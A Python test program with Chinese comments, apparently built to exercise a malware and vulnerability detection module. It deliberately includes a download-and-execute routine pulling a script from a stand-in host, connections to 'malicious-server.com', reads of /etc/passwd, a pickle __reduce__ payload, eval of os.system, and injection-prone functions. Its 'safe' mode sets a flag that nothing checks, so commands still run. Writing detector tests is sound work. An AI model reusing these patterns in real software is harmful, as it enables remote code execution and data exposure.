# test.py - 综合性漏洞测试程序
"""
此程序包含多种类型的漏洞，用于测试动态检测模块：
1. 动态检测相关的可疑行为
2. 静态代码分析相关的漏洞模式
3. 恶意行为模式
"""

import os
import sys
import subprocess
import socket
import pickle
import base64
import json
import time
import urllib.request
from typing import Optional, Any

# ==================== 动态检测相关的可疑行为 ====================

def execute_system_command(cmd: str) -> str:
    """模拟可疑的系统命令执行 - 会被动态检测捕获"""
    print(f"[INFO] 执行系统命令: {cmd}")
    try:
        # 方法1: 使用os.system - 容易被检测
        result = os.system(cmd)
        print(f"返回码: {result}")
        return str(result)
    except Exception as e:
        print(f"执行失败: {e}")
        return ""

def execute_subprocess() -> None:
    """使用subprocess执行命令 - 另一种可疑模式"""
    print("[INFO] 使用subprocess执行命令")
    try:
        # 危险的shell=True参数
        output = subprocess.check_output("whoami", shell=True, text=True)
        print(f"当前用户: {output.strip()}")
    except Exception as e:
        print(f"执行失败: {e}")

def suspicious_file_operations() -> None:
    """可疑的文件操作"""
    print("[INFO] 执行文件操作")
    
    # 尝试读取敏感文件
    sensitive_files = [
        r"C:\Windows\System32\drivers\etc\hosts",
        r"/etc/passwd",  # Linux路径，Windows上会失败
        "config.json"
    ]
    
    for file_path in sensitive_files:
        try:
            if os.path.exists(file_path):
                with open(file_path, 'r') as f:
                    content = f.read(100)  # 只读取前100字符
                    print(f"读取 {file_path}: {len(content)} 字符")
        except Exception as e:
            pass  # 静默失败

# ==================== 静态漏洞模式 ====================

# 1. 硬编码的敏感信息（静态漏洞）
API_KEY = "sk_live_1234567890abcdef1234567890abcdef"
DATABASE_PASSWORD = "Admin@123!"
SECRET_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

# 2. 不安全的反序列化（高危静态漏洞）
class MaliciousPayload:
    """恶意载荷类，用于演示不安全的反序列化"""
    def __reduce__(self):
        return (os.system, ('echo "反序列化漏洞触发"',))

def unsafe_deserialize(data: str) -> Any:
    """不安全的反序列化函数"""
    try:
        # 直接从base64解码并反序列化 - 高危操作！
        decoded = base64.b64decode(data)
        obj = pickle.loads(decoded)
        return obj
    except Exception as e:
        print(f"反序列化失败: {e}")
        return None

# 3. SQL注入漏洞模式（静态漏洞）
def sql_injection_vulnerable(user_input: str) -> str:
    """模拟SQL注入漏洞"""
    # 危险：直接拼接用户输入
    query = f"SELECT * FROM users WHERE username = '{user_input}'"
    print(f"生成的SQL查询: {query}")
    return query

# 4. 命令注入漏洞（静态漏洞）
def command_injection_vulnerable(ip_address: str) -> None:
    """模拟命令注入漏洞"""
    # 危险：直接拼接用户输入到命令中
    command = f"ping {ip_address}"
    print(f"执行命令: {command}")
    os.system(command)

# 5. 路径遍历漏洞（静态漏洞）
def path_traversal_vulnerable(filename: str) -> Optional[str]:
    """模拟路径遍历漏洞"""
    base_dir = "C:/data"
    # 危险：没有验证文件名
    file_path = os.path.join(base_dir, filename)
    
    try:
        with open(file_path, 'r') as f:
            return f.read()
    except Exception as e:
        print(f"读取文件失败: {e}")
        return None

# 6. 不安全的随机数（静态漏洞）
import random
def insecure_random() -> int:
    """使用不安全的随机数生成器"""
    return random.randint(0, 1000)  # 使用伪随机数

# 7. 弱加密算法（静态漏洞）
import hashlib
import hashlib
def weak_hash(password: str) -> str:
    """使用弱哈希算法"""
    # MD5是弱哈希算法
    return hashlib.md5(password.encode()).hexdigest()

# 8. 内存泄漏模式（静态漏洞）
class ResourceLeaker:
    """模拟资源泄漏"""
    def __init__(self):
        self.data = "x" * 1000000  # 分配大量内存
        self.file = open("temp.txt", "w")  # 打开文件但可能不关闭
    
    def __del__(self):
        """析构函数，但不保证会调用"""
        try:
            self.file.close()
        except:
            pass

# 9. 竞争条件模式（静态漏洞）
import threading
counter = 0
def race_condition():
    """模拟竞争条件"""
    global counter
    for _ in range(1000):
        current = counter
        # 危险：非原子操作
        counter = current + 1

# 10. XSS漏洞模式（静态漏洞）
def xss_vulnerable(user_input: str) -> str:
    """模拟XSS漏洞"""
    # 危险：直接返回用户输入，没有转义
    html = f"<div>{user_input}</div>"
    return html

# ==================== 模拟恶意行为 ====================

def suspicious_network_activity() -> None:
    """可疑的网络活动"""
    print("[INFO] 尝试网络连接")
    
    # 尝试连接外部地址
    suspicious_hosts = [
        "malicious-server.com",
        "192.168.1.100",
        "localhost"
    ]
    
    for host in suspicious_hosts:
        try:
            socket.create_connection((host, 80), timeout=2)
            print(f"成功连接到: {host}")
        except Exception:
            pass

def download_and_execute() -> None:
    """模拟下载并执行模式"""
    print("[INFO] 尝试下载外部脚本")
    
    try:
        # 尝试下载
        url = "http://example.com/malicious.py"
        response = urllib.request.urlopen(url, timeout=5)
        content = response.read(100)  # 只读取部分内容
        print(f"下载内容长度: {len(content)}")
        
        # 保存到临时文件
        temp_file = "temp_script.py"
        with open(temp_file, 'wb') as f:
            f.write(content)
        
        # 尝试执行
        subprocess.run([sys.executable, temp_file], capture_output=True)
        
        # 清理
        os.remove(temp_file)
    except Exception as e:
        print(f"下载失败: {e}")

def hide_behavior() -> None:
    """隐藏行为的技巧"""
    print("[INFO] 正常功能执行中...")
    
    # 延迟执行，避免立即被检测
    time.sleep(0.5)
    
    # 使用混淆的字符串
    encoded_cmd = base64.b64encode(b"whoami").decode()
    decoded_cmd = base64.b64decode(encoded_cmd).decode()
    
    # 动态构建命令
    parts = ["who", "am", "i"]
    cmd = "".join([p for p in parts])
    
    # 使用eval执行（高危！）
    try:
        result = eval("__import__('os').system('dir')")
        print(f"eval执行结果: {result}")
    except Exception as e:
        print(f"eval执行失败: {e}")

# ==================== 主程序逻辑 ====================

def main() -> None:
    """主函数 - 控制漏洞测试流程"""
    print("=" * 60)
    print("漏洞测试程序 v1.0")
    print("包含动态和静态漏洞示例")
    print("=" * 60)
    
    # 1. 执行动态可疑行为
    print("\n[阶段1] 动态可疑行为测试")
    print("-" * 40)
    
    # 条件执行，避免所有行为都立即触发
    if len(sys.argv) > 1 and sys.argv[1] == "test":
        execute_system_command("dir")
        execute_subprocess()
        suspicious_file_operations()
    
    # 2. 测试静态漏洞模式
    print("\n[阶段2] 静态漏洞模式测试")
    print("-" * 40)
    
    # 显示硬编码的敏感信息（不执行危险操作）
    print(f"API Key长度: {len(API_KEY)}")
    print(f"数据库密码长度: {len(DATABASE_PASSWORD)}")
    
    # 模拟不安全的反序列化（不实际执行）
    payload = MaliciousPayload()
    serialized = pickle.dumps(payload)
    encoded = base64.b64encode(serialized).decode()
    print(f"生成恶意载荷长度: {len(encoded)}")
    
    # 模拟SQL注入
    test_input = "admin' OR '1'='1"
    sql_query = sql_injection_vulnerable(test_input)
    print(f"模拟SQL注入: 输入='{test_input}'")
    
    # 3. 模拟恶意行为（有限执行）
    print("\n[阶段3] 模拟恶意行为")
    print("-" * 40)
    
    # 只执行部分行为，避免完全被检测为恶意
    if os.name == 'nt':  # Windows系统
        execute_system_command("echo %USERNAME%")
    else:  # Linux/Mac系统
        execute_system_command("whoami")
    
    # 隐藏行为测试
    hide_behavior()
    
    # 4. 弱加密和随机数测试
    print("\n[阶段4] 加密和随机数测试")
    print("-" * 40)
    
    password = "secret123"
    md5_hash = weak_hash(password)
    print(f"密码 '{password}' 的MD5哈希: {md5_hash}")
    
    random_num = insecure_random()
    print(f"生成的随机数: {random_num}")
    
    # 5. 多线程竞争条件测试
    print("\n[阶段5] 多线程测试")
    print("-" * 40)
    
    threads = []
    for i in range(5):
        t = threading.Thread(target=race_condition)
        threads.append(t)
        t.start()
    
    for t in threads:
        t.join()
    
    print(f"最终计数器值: {counter} (应该为5000，但可能有竞争条件)")
    
    # 6. 网络活动测试（有限）
    print("\n[阶段6] 网络活动测试")
    print("-" * 40)
    
    # 只测试本地连接，避免外部连接
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex(('127.0.0.1', 80))
        print(f"本地连接测试: {'成功' if result == 0 else '失败'}")
        sock.close()
    except Exception as e:
        print(f"网络测试异常: {e}")
    
    print("\n" + "=" * 60)
    print("漏洞测试完成")
    print("注意：此程序仅用于安全测试目的")
    print("=" * 60)

# ==================== 程序入口 ====================

if __name__ == "__main__":
    # 添加简单的参数控制
    import argparse
    
    parser = argparse.ArgumentParser(description='漏洞测试程序')
    parser.add_argument('--mode', type=str, default='safe',
                       choices=['safe', 'test', 'full'],
                       help='运行模式: safe(安全模式), test(测试模式), full(完整模式)')
    
    args = parser.parse_args()
    
    if args.mode == 'safe':
        print("安全模式 - 只显示信息，不执行可疑操作")
        # 修改配置，避免执行危险操作
        os.environ['SAFE_MODE'] = '1'
    elif args.mode == 'full':
        print("完整模式 - 执行所有测试（可能有风险）")
        # 移除安全限制
        if 'SAFE_MODE' in os.environ:
            del os.environ['SAFE_MODE']
    
    main()
